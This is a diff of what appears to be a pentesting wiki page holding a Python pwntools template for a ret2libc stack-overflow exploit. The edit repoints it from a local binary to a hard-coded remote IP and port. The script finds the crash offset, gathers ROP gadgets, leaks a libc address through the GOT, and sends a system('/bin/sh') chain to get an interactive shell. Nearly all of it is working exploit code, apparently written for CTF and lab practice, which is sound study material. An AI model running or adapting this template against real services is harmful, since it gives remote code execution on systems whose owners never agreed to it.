@@ -2,121 +2,161 @@
 
 {% code title="template.py" %}
 ```python
-from pwn import * # Import pwntools
+from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
 
 
 ####################
 #### CONNECTION ####
 ####################
-LOCAL = True
-REMOTETTCP = False
+LOCAL = False
+REMOTETTCP = True
 REMOTESSH = False
 GDB = False
 
-local_bin = "./vuln"
-remote_bin = "~/vuln" #For ssh
-libc = "" #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
+LOCAL_BIN = "./vuln"
+REMOTE_BIN = "~/vuln" #For ssh
+LIBC = "" #ELF("libc.so.6") #Set library path when know it
 
 if LOCAL:
-    p = process(local_bin) # start the vuln binary
-    elf = ELF(local_bin)# Extract data from binary
-    rop = ROP(elf)# Find ROP gadgets
+    P = process(LOCAL_BIN) # start the vuln binary
+    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
+    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets
 
 elif REMOTETTCP:
-    p = remote('docker.hackthebox.eu',31648) # start the vuln binary
-    elf = ELF(local_bin)# Extract data from binary
-    rop = ROP(elf)# Find ROP gadgets
+    P = remote('137.74.161.131',1339) # start the vuln binary
+    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
+    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets
 
 elif REMOTESSH:
     ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
-    p = ssh_shell.process(remote_bin) # start the vuln binary
-    elf = ELF(local_bin)# Extract data from binary
+    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
+    elf = ELF(LOCAL_BIN)# Extract data from binary
     rop = ROP(elf)# Find ROP gadgets
-
 
 if GDB and not REMOTETTCP and not REMOTESSH:
     # attach gdb and continue
     # You can set breakpoints, for example "break *main"
-    gdb.attach(p.pid, "continue")
+    gdb.attach(P.pid, "b *main")
 
 
-####################
-#### Find offset ###
-####################
-OFFSET = b""#b"A"*72
+
+##########################
+##### OFFSET FINDER ######
+##########################
+
+OFFSET = b"" #b"A"*264
 if OFFSET == b"":
-    gdb.attach(p.pid, "c") #Attach and continue
-    payload = cyclic(1000)
-    print(p.clean())
-    p.sendline(payload)
+    gdb.attach(P.pid, "c") #Attach and continue
+    payload = cyclic(264)
+    payload += b"AAAAAAAA"
+    print(P.clean())
+    P.sendline(payload)
     #x/wx $rsp -- Search for bytes that crashed the application
-    #print(f"Offset: {cyclic_find(0x6161616b)}") # Find the offset of those bytes
-    p.interactive()
+    #print(cyclic_find(0x63616171)) # Find the offset of those bytes
+    P.interactive()
     exit()
+
 
 
 #####################
 #### Find Gadgets ###
 #####################
 try:
-    PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
+    print_func = "puts"
+    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols["puts"] # This is also valid to call puts
 except:
-    PUTS_PLT = elf.plt['printf']
-MAIN_PLT = elf.symbols['main']
-POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
+    print_func = "printf"
+    PUTS_PLT = ELF_LOADED.plt['printf']
+
+MAIN_PLT = ELF_LOADED.symbols['main']
+POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
+RET = (ROP_LOADED.find_gadget(['ret']))[0]
 
 log.info("Main start: " + hex(MAIN_PLT))
 log.info("Puts plt: " + hex(PUTS_PLT))
 log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
+log.info("ret gadget: " + hex(RET))
 
-def get_addr(func_name):
-    FUNC_GOT = elf.got[func_name]
-    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
+
+#########################
+#### Finf LIBC offset ###
+#########################
+
+def generate_payload_aligned(rop):
+    payload1 = OFFSET + rop
+    if (len(payload1) % 16) == 0:
+        return payload1
+    
+    else:
+        payload2 = OFFSET + p64(RET) + rop
+        if (len(payload2) % 16) == 0:
+            log.info("Payload aligned successfully")
+            return payload2
+        else:
+            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
+            return payload1
+
+
+def get_addr(print_func):
+    FUNC_GOT = ELF_LOADED.got[print_func]
+    log.info(print_func + " GOT @ " + hex(FUNC_GOT))
     # Create rop chain
-    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
+    rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
+    rop1 = generate_payload_aligned(rop1)
 
-    #Send our rop-chain payload
-    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
-    print(p.clean()) # clean socket buffer (read all and print)
-    p.sendline(rop1)
+    # Send our rop-chain payload
+    #P.sendlineafter("dah?", rop1) #Use this to send the payload when something is received
+    print(P.clean()) # clean socket buffer (read all and print)
+    P.sendline(rop1)
 
-    #Parse leaked address
-    recieved = p.recvline().strip()
+    # If binary is echoing back the payload, remove that message
+    recieved = P.recvline().strip()
+    if OFFSET[:30] in recieved:
+        recieved = P.recvline().strip()
+    
+    # Parse leaked address
+    log.info(f"Len rop1: {len(rop1)}")
     leak = u64(recieved.ljust(8, b"\x00"))
-    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
-    #If not libc yet, stop here
-    if libc != "":
-        libc.address = leak - libc.symbols[func_name] #Save libc base
-        log.info("libc base @ %s" % hex(libc.address))
+    log.info(f"Leaked LIBC address,  {print_func}: {hex(leak)}")
+    
+    # Set lib base address
+    if LIBC:
+        LIBC.address = leak - LIBC.symbols[print_func] #Save LIBC base
+        log.info("LIBC base @ %s" % hex(LIBC.address))
+
+    # If not LIBC yet, stop here
+    else:
+        print("TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")
+        P.interactive()
     
     return hex(leak)
 
-get_addr("puts") #Search for puts address in memmory to obtains libc base
-if libc == "":
-    print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
-    p.interactive()
+get_addr(print_func) #Search for puts address in memmory to obtains LIBC base
 
-# Notice that if a libc was specified the base of the library will be saved in libc.address
-# this implies that in the future if you search for functions in libc, the resulting address
-# will be the real one, you can use it directly (NOT NEED TO ADD AGAINF THE LIBC BASE ADDRESS)
 
-#################################
-### GET SHELL with known LIBC ###
-#################################
-BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
-SYSTEM = libc.sym["system"]
-EXIT = libc.sym["exit"]
 
+##############################
+##### FINAL EXPLOITATION #####
+##############################
+
+BINSH = next(LIBC.search(b"/bin/sh")) #Verify with find /bin/sh
+SYSTEM = LIBC.sym["system"]
+EXIT = LIBC.sym["exit"]
+
+log.info("POP_RDI %s " % hex(POP_RDI))
 log.info("bin/sh %s " % hex(BINSH))
 log.info("system %s " % hex(SYSTEM))
+log.info("exit %s " % hex(EXIT))
 
-rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
+rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT)
+rop2 = generate_payload_aligned(rop2)
 
-p.clean()
-p.sendline(rop2)
 
-##### Interact with the shell #####
-p.interactive() #Interact with the conenction
+P.clean()
+P.sendline(rop2)
+
+
+P.interactive() #Interact with your shell :)
 ```
 {% endcode %}
 
